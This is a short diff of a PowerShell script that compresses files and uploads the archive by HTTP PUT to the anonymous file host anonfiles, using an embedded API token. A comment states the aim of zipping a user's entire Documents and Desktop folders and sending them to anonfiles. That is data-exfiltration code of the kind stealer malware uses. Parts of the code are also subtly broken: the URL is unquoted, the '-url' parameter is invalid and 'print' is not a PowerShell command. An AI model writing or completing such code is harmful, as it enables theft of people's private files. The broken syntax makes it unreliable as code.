@@ -7,8 +7,8 @@ Compress-Archive $input2 -update $datapath1
 
 $url = https://api.anonfiles.com/upload?token=6e578f0f3525bf07
 
-$s = Invoke-WebRequest -url $url -Method Put -Infile $datapath1
+$r = Invoke-WebRequest -url $url -Method Put -Infile $datapath1
 
-print "$s.Content"
- 
+print "$r.Content"
+
  #I still need some way to kompress the whole "Dokumekte" and "Desktop" folder so I can send them to anonfiles wich has a limitation of 3gb.
